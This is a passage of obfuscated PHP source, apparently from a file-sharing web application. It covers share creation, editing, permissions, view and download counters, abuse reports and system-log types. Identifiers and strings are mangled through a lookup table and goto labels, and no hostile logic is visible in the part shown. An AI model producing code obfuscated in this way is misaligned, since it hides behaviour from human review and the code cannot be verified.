$™Šúó¦Ç =& $_SERVER[Ùæõ‰Ï’]; $Ø°¸Ñä» = array(array($™Šúó¦Ç[562] => array($™Šúó¦Ç[1103], 0), $™Šúó¦Ç[663] => array($™Šúó¦Ç[1103], 0), $™Šúó¦Ç[2128] => $™Šúó¦Ç[2081])); if ($öîâùµ == $™Šúó¦Ç[2129]) { $Ø°¸Ñä» = array($™Šúó¦Ç[562] => 1); } else { if ($öîâùµ == $™Šúó¦Ç[1255]) { $Ø°¸Ñä» = array($™Šúó¦Ç[663] => 1); } } $Ø°¸Ñä»[$™Šúó¦Ç[1781]] = USER_ID; $Æ¡¨’Û„ = $this->where($Ø°¸Ñä»)->selectPage($‚¢¿¤); return $Æ¡¨’Û„; } protected function listToMe($Âî°ç•¨ = 300) { $’‡‹˜ô =& $_SERVER[Ùæõ‰Ï’]; $âƒÉó = Model($’‡‹˜ô[2130])->userGroupParents(USER_ID); $¸¹‰ŞäÃ = array($’‡‹˜ô[648] => SourceModel::TYPE_USER, $’‡‹˜ô[569] => USER_ID); if ($âƒÉó) { $¸¹‰ŞäÃ = array(array($’‡‹˜ô[648] => SourceModel::TYPE_USER, $’‡‹˜ô[569] => USER_ID), array($’‡‹˜ô[648] => SourceModel::TYPE_GROUP, $’‡‹˜ô[569] => array($’‡‹˜ô[7], $âƒÉó)), $’‡‹˜ô[2128] => $’‡‹˜ô[2081]); } $ú°‰½í‹ = Model($’‡‹˜ô[666])->where($¸¹‰ŞäÃ)->selectPage($Âî°ç•¨); $ïÁúÊ—Ë = array_to_keyvalue_group($ú°‰½í‹[$’‡‹˜ô[445]], $’‡‹˜ô[665]); if (!$ïÁúÊ—Ë) { return $ú°‰½í‹; } $•Øô„ÎÒ = $’‡‹˜ô[2131]; $¸¹‰ŞäÃ = array($’‡‹˜ô[665] => array($’‡‹˜ô[492], array_keys($ïÁúÊ—Ë)), $’‡‹˜ô[1781] => array($’‡‹˜ô[1105], $’‡‹˜ô[228])); $ÊğäæöÓ = $this->field($•Øô„ÎÒ)->where($¸¹‰ŞäÃ)->select(); foreach ($ÊğäæöÓ as $µÛ©ƒŠ => &$ó³¼ªÌ¥) { $ó³¼ªÌ¥[$’‡‹˜ô[2127]] = $ïÁúÊ—Ë[$ó³¼ªÌ¥[$’‡‹˜ô[665]]]; } unset($ó³¼ªÌ¥); $òÛ–Æû€ = array($’‡‹˜ô[2132] => $ÊğäæöÓ, $’‡‹˜ô[2133] => $ú°‰½í‹[$’‡‹˜ô[442]]); return $òÛ–Æû€; } protected function shareAdd($’–•Ææ, $«æ€£™ä) { $ªãºÑÅ =& $_SERVER[Ùæõ‰Ï’]; $áßˆ½Ò = $this->_addShareData($’–•Ææ, $«æ€£™ä); if (!empty($«æ€£™ä[$ªãºÑÅ[2134]])) { $this->_shareAuthSet($áßˆ½Ò, $«æ€£™ä[$ªãºÑÅ[2134]]); } $this->shareEventAdd($’–•Ææ, $«æ€£™ä, $ªãºÑÅ[2135]); return $áßˆ½Ò; } protected function shareAddSystem($ãû¯ãß, $ æ…Ê–µ) { $äğ’±‹Á =& $_SERVER[Ùæõ‰Ï’]; $ğ±ÉãÜ = $this->_addShareData($ãû¯ãß, $ æ…Ê–µ, $äğ’±‹Á[191]); $this->_shareAuthSet($ğ±ÉãÜ, $ æ…Ê–µ[$äğ’±‹Á[2134]]); return $ğ±ÉãÜ; } private function shareEventAdd($åõıÒš, $ğÑ¢Íá, $‘¨¿¶Ï = "\141\x64\x64") { $ÀÊæÉ£ì =& $_SERVER[Ùæõ‰Ï’]; if (!$åõıÒš || $åõıÒš == $ÀÊæÉ£ì[228]) { return; } if ($‘¨¿¶Ï == $ÀÊæÉ£ì[2135]) { if ($ğÑ¢Íá[$ÀÊæÉ£ì[562]] == $ÀÊæÉ£ì[91]) { Model($ÀÊæÉ£ì[633])->eventShare($åõıÒš, $ÀÊæÉ£ì[2136]); } if ($ğÑ¢Íá[$ÀÊæÉ£ì[663]] == $ÀÊæÉ£ì[91]) { Model($ÀÊæÉ£ì[633])->eventShare($åõıÒš, $ÀÊæÉ£ì[2137]); } return; } $üû³ÓÚ = $this->getInfoByPath($åõıÒš); $œôÄÀÆª = $ÀÊæÉ£ì[2138]; if ($üû³ÓÚ[$ÀÊæÉ£ì[562]] == $ÀÊæÉ£ì[228] && $ğÑ¢Íá[$ÀÊæÉ£ì[562]] == $ÀÊæÉ£ì[91]) { $œôÄÀÆª = $ÀÊæÉ£ì[2136]; } if ($üû³ÓÚ[$ÀÊæÉ£ì[562]] == $ÀÊæÉ£ì[91] && $ğÑ¢Íá[$ÀÊæÉ£ì[562]] == $ÀÊæÉ£ì[228]) { $œôÄÀÆª = $ÀÊæÉ£ì[2139]; } if ($üû³ÓÚ[$ÀÊæÉ£ì[663]] == $ÀÊæÉ£ì[228] && $ğÑ¢Íá[$ÀÊæÉ£ì[663]] == $ÀÊæÉ£ì[91]) { $œôÄÀÆª = $ÀÊæÉ£ì[2137]; } if ($üû³ÓÚ[$ÀÊæÉ£ì[663]] == $ÀÊæÉ£ì[91] && $ğÑ¢Íá[$ÀÊæÉ£ì[663]] == $ÀÊæÉ£ì[228]) { $œôÄÀÆª = $ÀÊæÉ£ì[2140]; } Model($ÀÊæÉ£ì[633])->eventShare($åõıÒš, $œôÄÀÆª); return; } private function _addShareData($æûñ÷ì, $Ë»Ä ê” = array(), $È°’­‘¸ = false) { $ïÉëíò½ =& $_SERVER[Ùæõ‰Ï’]; $¢Î×“˜Ÿ = $È°’­‘¸ == $ïÉëíò½[191] ? 0 : USER_ID; $œÁ‰úÆ— = array($ïÉëíò½[491] => $æûñ÷ì, $ïÉëíò½[1772] => $¢Î×“˜Ÿ); if ($æûñ÷ì == 0) { $œÁ‰úÆ— = array($ïÉëíò½[2141] => $Ë»Ä ê”[$ïÉëíò½[1270]], $ïÉëíò½[1772] => $¢Î×“˜Ÿ); } if ($ô„‹‹•ß = $this->where($œÁ‰úÆ—)->find()) { return $ô„‹‹•ß[$ïÉëíò½[665]]; } if ($æûñ÷ì == 0) { $İ®ëö¡² = array($ïÉëíò½[32] => get_path_this($Ë»Ä ê”[$ïÉëíò½[87]])); } else { $İ®ëö¡² = Model($ïÉëíò½[907])->sourceInfo($æûñ÷ì); if (!$İ®ëö¡²) { return !1; } } if (!$Ë»Ä ê”[$ïÉëíò½[1670]]) { $Ë»Ä ê”[$ïÉëíò½[1670]] = $İ®ëö¡²[$ïÉëíò½[32]]; } $¢·ŒŠó¬ = array($ïÉëíò½[1772] => $¢Î×“˜Ÿ, $ïÉëíò½[491] => $æûñ÷ì, $ïÉëíò½[1670] => $ïÉëíò½[12], $ïÉëíò½[562] => 0, $ïÉëíò½[663] => 0, $ïÉëíò½[1270] => $ïÉëíò½[12], $ïÉëíò½[383] => $ïÉëíò½[12], $ïÉëíò½[978] => $ïÉëíò½[12], $ïÉëíò½[2142] => 0, $ïÉëíò½[2143] => 0, $ïÉëíò½[844] => 0, $ïÉëíò½[2144] => $ïÉëíò½[12], $ïÉëíò½[2125] => $ïÉëíò½[12]); $»ù©Ô‘§ = explode($ïÉëíò½[50], $ïÉëíò½[2145]); foreach ($»ù©Ô‘§ as $·æÃÑå) { if (!isset($Ë»Ä ê”[$·æÃÑå])) { continue; } $¢·ŒŠó¬[$·æÃÑå] = $Ë»Ä ê”[$·æÃÑå]; } $©•Ô¾ğ = $this->add($¢·ŒŠó¬); $ÁÈ±¨áÁ = array($ïÉëíò½[2125] => short_id($©•Ô¾ğ)); $this->where(array($ïÉëíò½[2146] => $©•Ô¾ğ))->save($ÁÈ±¨áÁ); return $©•Ô¾ğ; } private function _shareAuthSet($‡Í·–Ş, $‡¯Ã”±) { $‰ĞÇĞ¡» =& $_SERVER[Ùæõ‰Ï’]; if (!is_array($‡¯Ã”±)) { return !1; } $¹õ©« = Model($‰ĞÇĞ¡»[2091]); $¹õ©«->where(array($‰ĞÇĞ¡»[665] => $‡Í·–Ş))->delete(); $è ¿Ìı = array(); foreach ($‡¯Ã”± as $ ±šêÕİ) { $“»¢ûÆâ = SourceModel::TYPE_USER; if ($ ±šêÕİ[$‰ĞÇĞ¡»[190]] == SourceModel::TYPE_GROUP) { $“»¢ûÆâ = SourceModel::TYPE_GROUP; } $îÌŸŠœ¶ = array($‰ĞÇĞ¡»[665] => $‡Í·–Ş, $‰ĞÇĞ¡»[190] => $“»¢ûÆâ, $‰ĞÇĞ¡»[569] => intval($ ±šêÕİ[$‰ĞÇĞ¡»[569]]), $‰ĞÇĞ¡»[2087] => 0, $‰ĞÇĞ¡»[2147] => -1); if ($ ±šêÕİ[$‰ĞÇĞ¡»[2087]]) { $îÌŸŠœ¶[$‰ĞÇĞ¡»[2087]] = $ ±šêÕİ[$‰ĞÇĞ¡»[2087]]; } else { if ($ ±šêÕİ[$‰ĞÇĞ¡»[2147]]) { $îÌŸŠœ¶[$‰ĞÇĞ¡»[2147]] = $ ±šêÕİ[$‰ĞÇĞ¡»[2147]]; } } $è ¿Ìı[] = $îÌŸŠœ¶; } return $¹õ©«->addAll($è ¿Ìı, array(), !0); } public function numViewAdd($”ÁÔšÜ) { $ˆÈÂˆ—Ğ =& $_SERVER[Ùæõ‰Ï’]; $ÒÖƒ¦éô = array($ˆÈÂˆ—Ğ[2146] => $”ÁÔšÜ); $this->where($ÒÖƒ¦éô)->setAdd($ˆÈÂˆ—Ğ[2142]); } public function numDownloadAdd($ÓÙ÷¼©…) { $Ô¤ãı¯Ê =& $_SERVER[Ùæõ‰Ï’]; $—óû«Õ = array($Ô¤ãı¯Ê[2146] => $ÓÙ÷¼©…); $this->where($—óû«Õ)->setAdd($Ô¤ãı¯Ê[2143]); } protected function shareEdit($±ğÅÔ¥, $ß®ò²À€) { $üã…ùİÂ =& $_SERVER[Ùæõ‰Ï’]; $ˆ™‹ú³™ = $this->getInfo($±ğÅÔ¥); if (!$ˆ™‹ú³™) { return !1; } $this->_checkLinkShare($ß®ò²À€, $ˆ™‹ú³™); $¿ÇõĞ¦§ = array(); $«Ó£²Èİ = explode($üã…ùİÂ[50], $üã…ùİÂ[2148]); foreach ($«Ó£²Èİ as $ÅÒÓ§æÏ) { if (!array_key_exists($ÅÒÓ§æÏ, $ß®ò²À€)) { continue; } $¿ÇõĞ¦§[$ÅÒÓ§æÏ] = $ß®ò²À€[$ÅÒÓ§æÏ]; } $this->shareEventAdd($ˆ™‹ú³™[$üã…ùİÂ[193]], $ß®ò²À€, $üã…ùİÂ[1949]); $this->where(array($üã…ùİÂ[2146] => $±ğÅÔ¥))->save($¿ÇõĞ¦§); if (isset($ß®ò²À€[$üã…ùİÂ[2134]])) { $this->_shareAuthSet($±ğÅÔ¥, $ß®ò²À€[$üã…ùİÂ[2134]]); } return !0; } private function _checkLinkShare($£È£í‡Ç, $¶á ¨µü) { $Ñ´¢ŸòØ =& $_SERVER[Ùæõ‰Ï’]; if ($£È£í‡Ç[$Ñ´¢ŸòØ[562]] != $Ñ´¢ŸòØ[91]) { return; } $™ú¯Ê­å = $¶á ¨µü[$Ñ´¢ŸòØ[90]][$Ñ´¢ŸòØ[193]]; if ($¶á ¨µü[$Ñ´¢ŸòØ[90]][$Ñ´¢ŸòØ[33]] != $Ñ´¢ŸòØ[230]) { $üŸ¢úØŠ = $this->_folderReport($™ú¯Ê­å); if (!$üŸ¢úØŠ) { return; } show_json(LNG($Ñ´¢ŸòØ[2149]) . $Ñ´¢ŸòØ[2150] . $üŸ¢úØŠ, !1); } $´¨µ¯µå = Model($Ñ´¢ŸòØ[907])->fileInfoGet($¶á ¨µü[$Ñ´¢ŸòØ[90]][$Ñ´¢ŸòØ[193]]); if (!$´¨µ¯µå) { return; } $íºÉ‰ÕŸ = $this->shareFileMeta($´¨µ¯µå[$Ñ´¢ŸòØ[541]]); if (isset($íºÉ‰ÕŸ[$Ñ´¢ŸòØ[450]]) && $íºÉ‰ÕŸ[$Ñ´¢ŸòØ[450]] == $Ñ´¢ŸòØ[91]) { show_json(LNG($Ñ´¢ŸòØ[2151]), !1); } } private function _folderReport($¸Ç÷Î¤) { $÷£ä´ŞÄ =& $_SERVER[Ùæõ‰Ï’]; $ïşæÕÃã = array($÷£ä´ŞÄ[541] => array($÷£ä´ŞÄ[1103], 0), $÷£ä´ŞÄ[833] => 3); $×ˆö¿Ôú = Model($÷£ä´ŞÄ[2152])->where($ïşæÕÃã)->field($÷£ä´ŞÄ[541])->select(); if (!$×ˆö¿Ôú) { return !1; } $×ˆö¿Ôú = array_to_keyvalue($×ˆö¿Ôú, $÷£ä´ŞÄ[12], $÷£ä´ŞÄ[541]); $‘æèñ“ü = $÷£ä´ŞÄ[50] . $¸Ç÷Î¤ . $÷£ä´ŞÄ[50]; $ïşæÕÃã = array($÷£ä´ŞÄ[541] => array($÷£ä´ŞÄ[7], $×ˆö¿Ôú), $÷£ä´ŞÄ[584] => array($÷£ä´ŞÄ[459], "\x25{$‘æèñ“ü}\45"), $÷£ä´ŞÄ[505] => 0); $Íû³ğşè = Model($÷£ä´ŞÄ[907])->where($ïşæÕÃã)->field($÷£ä´ŞÄ[2153])->find(); if (!$Íû³ğşè) { return !1; } $Í§×¸ğ = substr($Íû³ğşè[$÷£ä´ŞÄ[584]], strpos($Íû³ğşè[$÷£ä´ŞÄ[584]], $‘æèñ“ü)); $ïşæÕÃã = array($÷£ä´ŞÄ[193] => array($÷£ä´ŞÄ[7], trim($Í§×¸ğ, $÷£ä´ŞÄ[50]))); $ÊÂ¸‘È© = Model($÷£ä´ŞÄ[907])->where($ïşæÕÃã)->field($÷£ä´ŞÄ[32])->select(); $¶ˆàò—à = array_to_keyvalue($ÊÂ¸‘È©, $÷£ä´ŞÄ[12], $÷£ä´ŞÄ[32]); $¶ˆàò—à[] = $Íû³ğşè[$÷£ä´ŞÄ[32]]; return implode($÷£ä´ŞÄ[8], $¶ˆàò—à); } protected function remove($Ô¿àğ¼‰) { $î²¶ìğ¼ =& $_SERVER[Ùæõ‰Ï’]; $ °¿â´¢ = is_array($Ô¿àğ¼‰) ? $Ô¿àğ¼‰ : array($Ô¿àğ¼‰); for ($é¥ÌÄ¤È = 0; $é¥ÌÄ¤È < count($ °¿â´¢); $é¥ÌÄ¤È++) { $›Å›ö‹ş = $this->getInfo($ °¿â´¢[$é¥ÌÄ¤È]); if ($›Å›ö‹ş[$î²¶ìğ¼[663]] == $î²¶ìğ¼[91]) { Model($î²¶ìğ¼[633])->eventShare($›Å›ö‹ş[$î²¶ìğ¼[193]], $î²¶ìğ¼[2140]); } if ($›Å›ö‹ş[$î²¶ìğ¼[562]] == $î²¶ìğ¼[91]) { Model($î²¶ìğ¼[633])->eventShare($›Å›ö‹ş[$î²¶ìğ¼[193]], $î²¶ìğ¼[2139]); } } if (is_array($Ô¿àğ¼‰)) { $Ô¿àğ¼‰ = array($î²¶ìğ¼[7], $Ô¿àğ¼‰); } $¶™ºÄÖë = array($î²¶ìğ¼[665] => $Ô¿àğ¼‰); $’©ÁÒÏĞ = $this->where($¶™ºÄÖë)->delete(); if ($’©ÁÒÏĞ) { Model($î²¶ìğ¼[666])->where(array($î²¶ìğ¼[665] => $Ô¿àğ¼‰))->delete(); } return $’©ÁÒÏĞ; } protected function removeBySource($øÇóØç) { $É£ã„ª =& $_SERVER[Ùæõ‰Ï’]; $ä¬³ÍôÑ = array($É£ã„ª[491] => array($É£ã„ª[492], $øÇóØç)); $„è´ËÂÆ = $this->field($É£ã„ª[665])->where($ä¬³ÍôÑ)->select(); $„è´ËÂÆ = array_to_keyvalue($„è´ËÂÆ, $É£ã„ª[12], $É£ã„ª[665]); if (!$„è´ËÂÆ) { return; } $ä¬³ÍôÑ = array($É£ã„ª[2146] => array($É£ã„ª[492], $„è´ËÂÆ)); $this->where($ä¬³ÍôÑ)->delete(); Model($É£ã„ª[666])->where($ä¬³ÍôÑ)->delete(); } public function listAll($òÜÈÂ´®) { $¸û»í¥ =& $_SERVER[Ùæõ‰Ï’]; $ºËÔÇĞ = array(); if ($òÜÈÂ´®[$¸û»í¥[1781]]) { $ºËÔÇĞ[$¸û»í¥[1781]] = $òÜÈÂ´®[$¸û»í¥[1781]]; } if ($òÜÈÂ´®[$¸û»í¥[843]]) { $îÃ˜ÍŸÇ = $òÜÈÂ´®[$¸û»í¥[844]] ? $òÜÈÂ´®[$¸û»í¥[844]] : strtotime(date($¸û»í¥[2154])); $ºËÔÇĞ[$¸û»í¥[231]] = array($¸û»í¥[409], array($òÜÈÂ´®[$¸û»í¥[843]], $îÃ˜ÍŸÇ)); } if ($òÜÈÂ´®[$¸û»í¥[33]]) { $ºËÔÇĞ[$òÜÈÂ´®[$¸û»í¥[33]]] = 1; } else { $ºËÔÇĞ[] = array($¸û»í¥[562] => array($¸û»í¥[1103], 0), $¸û»í¥[663] => array($¸û»í¥[1103], 0), $¸û»í¥[2128] => $¸û»í¥[2081]); } if ($òÜÈÂ´®[$¸û»í¥[2077]]) { $ºËÔÇĞ[] = array($¸û»í¥[2125] => $òÜÈÂ´®[$¸û»í¥[2077]], $¸û»í¥[1670] => array($¸û»í¥[459], "\x25{$òÜÈÂ´®[$¸û»í¥[2077]]}\45"), $¸û»í¥[2128] => $¸û»í¥[2081]); } $Šö½«ã = $this->_makeOrder()->where($ºËÔÇĞ)->selectPage(20); if (empty($Šö½«ã[$¸û»í¥[445]])) { return array(); } $this->_listDataApply($Šö½«ã[$¸û»í¥[445]]); return $Šö½«ã; } public function listDataApply($à®­İê›) { $this->_listDataApply($à®­İê›); return $à®­İê›; } private function _listDataApply(&$óüæÒÌÌ) { $Çğ­ÔÉ° =& $_SERVER[Ùæõ‰Ï’]; $Ëç‹¾‰ = array_to_keyvalue($óüæÒÌÌ, $Çğ­ÔÉ°[12], $Çğ­ÔÉ°[1781]); $½áÕŒçÏ = Model($Çğ­ÔÉ°[598])->userListInfo(array_unique($Ëç‹¾‰)); $È¨¢şô¤ = array_to_keyvalue($óüæÒÌÌ, $Çğ­ÔÉ°[12], $Çğ­ÔÉ°[193]); $È³å–À = Model($Çğ­ÔÉ°[907])->sourceListInfo($È¨¢şô¤, !0); foreach ($óüæÒÌÌ as $¶„—Š£ => &$÷İü‰Şı) { $ã¯“¯º = $÷İü‰Şı[$Çğ­ÔÉ°[1781]]; $÷İü‰Şı[$Çğ­ÔÉ°[2155]] = $½áÕŒçÏ[$ã¯“¯º] ? $½áÕŒçÏ[$ã¯“¯º] : !1; $å™â±ıö = $÷İü‰Şı[$Çğ­ÔÉ°[193]]; $÷İü‰Şı[$Çğ­ÔÉ°[90]] = $È³å–À[$å™â±ıö] ? $È³å–À[$å™â±ıö] : !1; if ($÷İü‰Şı[$Çğ­ÔÉ°[90]][$Çğ­ÔÉ°[505]] == $Çğ­ÔÉ°[91]) { unset($óüæÒÌÌ[$¶„—Š£]); } if ($÷İü‰Şı[$Çğ­ÔÉ°[90]] != $Çğ­ÔÉ°[228] && !$÷İü‰Şı[$Çğ­ÔÉ°[90]]) { unset($óüæÒÌÌ[$¶„—Š£]); } } unset($÷İü‰Şı); $óüæÒÌÌ = array_values($óüæÒÌÌ); } private function _makeOrder($Û§‡”Ø· = '') { $Ò “ óª =& $_SERVER[Ùæõ‰Ï’]; $Ñì–Æ” = array($Ò “ óª[231], $Ò “ óª[844], $Ò “ óª[2142], $Ò “ óª[2143]); $íéúùå„ = array($Ò “ óª[523] => $Ò “ óª[524], $Ò “ óª[525] => $Ò “ óª[526]); $ ÷ÖüïŒ = Input::get($Ò “ óª[530], $Ò “ óª[7], $Ò “ óª[497], $Ñì–Æ”); $Üûœº‡Ì = Input::get($Ò “ óª[531], $Ò “ óª[7], $Ò “ óª[2156], array($Ò “ óª[2074], $Ò “ óª[525])); $Üûœº‡Ì = $íéúùå„[$Üûœº‡Ì]; $Û§‡”Ø· = $Û§‡”Ø· . "{$ ÷ÖüïŒ}\x20{$Üûœº‡Ì}"; return $this->order($Û§‡”Ø·); } public function reportAdd($¼ªôï³ù) { $ı²¯Ò¢» =& $_SERVER[Ùæõ‰Ï’]; $£…©Ö¥ = array($ı²¯Ò¢»[665] => $¼ªôï³ù[$ı²¯Ò¢»[665]], $ı²¯Ò¢»[1781] => USER_ID); if (Model($ı²¯Ò¢»[2152])->where($£…©Ö¥)->find()) { return !1; } $íƒéÕ¾æ = array($ı²¯Ò¢»[665] => $¼ªôï³ù[$ı²¯Ò¢»[665]], $ı²¯Ò¢»[1670] => $¼ªôï³ù[$ı²¯Ò¢»[1670]], $ı²¯Ò¢»[193] => $¼ªôï³ù[$ı²¯Ò¢»[193]], $ı²¯Ò¢»[541] => $¼ªôï³ù[$ı²¯Ò¢»[541]], $ı²¯Ò¢»[1781] => USER_ID, $ı²¯Ò¢»[33] => $¼ªôï³ù[$ı²¯Ò¢»[33]], $ı²¯Ò¢»[526] => $¼ªôï³ù[$ı²¯Ò¢»[526]]); return Model($ı²¯Ò¢»[2152])->add($íƒéÕ¾æ); } public function reportList($ÌŠ²üï°) { $Âù¹â =& $_SERVER[Ùæõ‰Ï’]; $•àõü = array(); if ($ÌŠ²üï°[$Âù¹â[843]]) { $Ø§È‡¨ = $ÌŠ²üï°[$Âù¹â[844]] ? $ÌŠ²üï°[$Âù¹â[844]] : strtotime(date($Âù¹â[2154])); $•àõü[$Âù¹â[231]] = array($Âù¹â[409], array($ÌŠ²üï°[$Âù¹â[843]], $Ø§È‡¨)); } if (isset($ÌŠ²üï°[$Âù¹â[33]]) && in_array($ÌŠ²üï°[$Âù¹â[33]], array($Âù¹â[91], $Âù¹â[510], $Âù¹â[2157], $Âù¹â[2158], $Âù¹â[2159]))) { $•àõü[$Âù¹â[33]] = $ÌŠ²üï°[$Âù¹â[33]]; } if (isset($ÌŠ²üï°[$Âù¹â[833]]) && in_array($ÌŠ²üï°[$Âù¹â[833]], array($Âù¹â[228], $Âù¹â[91], $Âù¹â[510], $Âù¹â[2157]))) { $•àõü[$Âù¹â[833]] = $ÌŠ²üï°[$Âù¹â[833]]; } $ˆ¡¶âÖ— = Input::get($Âù¹â[531], $Âù¹â[7], $Âù¹â[2156], array($Âù¹â[2074], $Âù¹â[525])); $‘´ë´õŠ = array($Âù¹â[523] => $Âù¹â[524], $Âù¹â[525] => $Âù¹â[526]); $ã––¾êµ = $Âù¹â[2160] . $‘´ë´õŠ[$ˆ¡¶âÖ—]; $çŞ†éœ = Model($Âù¹â[2152])->where($•àõü)->order($ã––¾êµ)->selectPage(20); if (empty($çŞ†éœ[$Âù¹â[445]])) { return array(); } $ˆ’ºÖÌ« = array_to_keyvalue_group($çŞ†éœ[$Âù¹â[445]], $Âù¹â[833], $Âù¹â[665]); if (!empty($ˆ’ºÖÌ«[0])) { $ÌŠ²üï° = $ˆ’ºÖÌ«[0]; $•àõü = array($Âù¹â[665] => array($Âù¹â[7], $ÌŠ²üï°)); $ƒ›ûÒ¼ş = $this->where($•àõü)->field($Âù¹â[665])->select(); $ƒ›ûÒ¼ş = array_to_keyvalue($ƒ›ûÒ¼ş, $Âù¹â[12], $Âù¹â[665]); $ƒ»ğîÒÙ = array_diff($ÌŠ²üï°, $ƒ›ûÒ¼ş); if (!empty($ƒ»ğîÒÙ)) { foreach ($çŞ†éœ[$Âù¹â[445]] as $ÉÓŒıÄª => $—¨àˆŞù) { if (in_array($—¨àˆŞù[$Âù¹â[665]], $ƒ»ğîÒÙ)) { unset($çŞ†éœ[$Âù¹â[445]][$ÉÓŒıÄª]); } } } } $this->_listDataApply($çŞ†éœ[$Âù¹â[445]]); return $çŞ†éœ; } public function reportStatus($ŠšñÚÈ) { $…á›Œã¥ =& $_SERVER[Ùæõ‰Ï’]; $‹ÌñÈÖ˜ = array($…á›Œã¥[475] => $ŠšñÚÈ[$…á›Œã¥[475]]); $½üÍÃ = Model($…á›Œã¥[2152])->where($‹ÌñÈÖ˜)->field($…á›Œã¥[2161])->find(); if (!$½üÍÃ) { return !1; } $ä©¿‰çê = array($…á›Œã¥[833] => $ŠšñÚÈ[$…á›Œã¥[833]]); if ($ŠšñÚÈ[$…á›Œã¥[833]] == $…á›Œã¥[2157] && $½üÍÃ[$…á›Œã¥[833]] == $…á›Œã¥[2157]) { $ä©¿‰çê[$…á›Œã¥[833]] = 0; } $ò£¤ä¨ = Model($…á›Œã¥[2152])->where($‹ÌñÈÖ˜)->save($ä©¿‰çê); if ($ŠšñÚÈ[$…á›Œã¥[833]] == $…á›Œã¥[510]) { if ($½üÍÃ[$…á›Œã¥[541]] != $…á›Œã¥[228] && $this->shareFileMeta($½üÍÃ[$…á›Œã¥[541]])) { $this->shareFileMeta($½üÍÃ[$…á›Œã¥[541]], 0); } $this->remove($½üÍÃ[$…á›Œã¥[665]]); return !0; } if ($ò£¤ä¨ && $ŠšñÚÈ[$…á›Œã¥[833]] == $…á›Œã¥[2157]) { $ƒ”µŠ¿“ = $ä©¿‰çê[$…á›Œã¥[833]] == $…á›Œã¥[2157] ? 1 : 0; $this->shareFileMeta($½üÍÃ[$…á›Œã¥[541]], $ƒ”µŠ¿“); $this->removeByFile($½üÍÃ[$…á›Œã¥[541]]); } return $ò£¤ä¨; } private function removeByFile($¡§ĞÑğ) { $™±¨—‰¶ =& $_SERVER[Ùæõ‰Ï’]; $ƒåŒçø = Model($™±¨—‰¶[907])->where(array($™±¨—‰¶[541] => $¡§ĞÑğ))->field($™±¨—‰¶[193])->select(); $ù”Ì´Ü¥ = array_to_keyvalue($ƒåŒçø, $™±¨—‰¶[12], $™±¨—‰¶[193]); $ò¶Šø¿ç = array($™±¨—‰¶[193] => array($™±¨—‰¶[7], $ù”Ì´Ü¥), $™±¨—‰¶[562] => 1); $ƒåŒçø = $this->where($ò¶Šø¿ç)->field($™±¨—‰¶[665])->select(); if (empty($ƒåŒçø)) { return; } $¥ıİèÀ = array_to_keyvalue($ƒåŒçø, $™±¨—‰¶[12], $™±¨—‰¶[665]); $this->remove($¥ıİèÀ); } private function shareFileMeta($­•ƒÔ‚Ğ, $Œäœã²È = null) { $™¦ßê§ş =& $_SERVER[Ùæõ‰Ï’]; $Î¼ı› = array($™¦ßê§ş[541] => $­•ƒÔ‚Ğ, $™¦ßê§ş[97] => $™¦ßê§ş[2162]); if (is_null($Œäœã²È)) { return Model($™¦ßê§ş[2163])->where($Î¼ı›)->find(); } $Î¼ı›[$™¦ßê§ş[450]] = $Œäœã²È; Model($™¦ßê§ş[2163])->add($Î¼ı›, array(), !0); } } goto cËñéÑïµ; bœ½ƒù‡‹²: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\145\x72\164", "\x66\165\x6e\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $»×·ÃÇ =& $_SERVER[Ùæõ‰Ï’]; return array($»×·ÃÇ[2340] => LNG($»×·ÃÇ[2341]), $»×·ÃÇ[2342] => LNG($»×·ÃÇ[2343]), $»×·ÃÇ[1922] => LNG($»×·ÃÇ[2344]), $»×·ÃÇ[2345] => LNG($»×·ÃÇ[2346]), $»×·ÃÇ[2347] => LNG($»×·ÃÇ[2348]), $»×·ÃÇ[2349] => LNG($»×·ÃÇ[2350]), $»×·ÃÇ[2351] => LNG($»×·ÃÇ[2352]), $»×·ÃÇ[1952] => LNG($»×·ÃÇ[2352]), $»×·ÃÇ[1953] => LNG($»×·ÃÇ[2353]), $»×·ÃÇ[2354] => LNG($»×·ÃÇ[2355]), $»×·ÃÇ[2356] => LNG($»×·ÃÇ[2357]), $»×·ÃÇ[2358] => LNG($»×·ÃÇ[2359]), $»×·ÃÇ[2360] => LNG($»×·ÃÇ[2361]), $»×·ÃÇ[1950] => LNG($»×·ÃÇ[2362]), $»×·ÃÇ[2363] => LNG($»×·ÃÇ[2364]), $»×·ÃÇ[1957] => LNG($»×·ÃÇ[2365]), $»×·ÃÇ[2366] => LNG($»×·ÃÇ[2367]), $»×·ÃÇ[2368] => LNG($»×·ÃÇ[2369]), $»×·ÃÇ[2370] => LNG($»×·ÃÇ[2371]), $»×·ÃÇ[2372] => LNG($»×·ÃÇ[2373]), $»×·ÃÇ[1960] => LNG($»×·ÃÇ[2374]), $»×·ÃÇ[1961] => LNG($»×·ÃÇ[2375]), $»×·ÃÇ[2376] => LNG($»×·ÃÇ[2377]), $»×·ÃÇ[2378] => LNG($»×·ÃÇ[2379]), $»×·ÃÇ[2380] => LNG($»×·ÃÇ[2381]), $»×·ÃÇ[1955] => LNG($»×·ÃÇ[2382]), $»×·ÃÇ[2383] => LNG($»×·ÃÇ[2384]), $»×·ÃÇ[1954] => LNG($»×·ÃÇ[2385]), $»×·ÃÇ[2386] => LNG($»×·ÃÇ[2387]), $»×·ÃÇ[2388] => LNG($»×·ÃÇ[2389]), $»×·ÃÇ[2390] => LNG($»×·ÃÇ[2389]), $»×·ÃÇ[2391] => LNG($»×·ÃÇ[2392]), $»×·ÃÇ[2393] => LNG($»×·ÃÇ[2393]), $»×·ÃÇ[2394] => LNG($»×·ÃÇ[1926]), $»×·ÃÇ[2395] => LNG($»×·ÃÇ[2396]), $»×·ÃÇ[2397] => LNG($»×·ÃÇ[2398]), $»×·ÃÇ[2399] => LNG($»×·ÃÇ[2400]), $»×·ÃÇ[2401] => LNG($»×·ÃÇ[2402]), $»×·ÃÇ[2403] => LNG($»×·ÃÇ[2404]), $»×·ÃÇ[2405] => LNG($»×·ÃÇ[2405]), $»×·ÃÇ[2406] => LNG($»×·ÃÇ[2407]), $»×·ÃÇ[2408] => LNG($»×·ÃÇ[2409]), $»×·ÃÇ[2410] => LNG($»×·ÃÇ[2411]), $»×·ÃÇ[2412] => 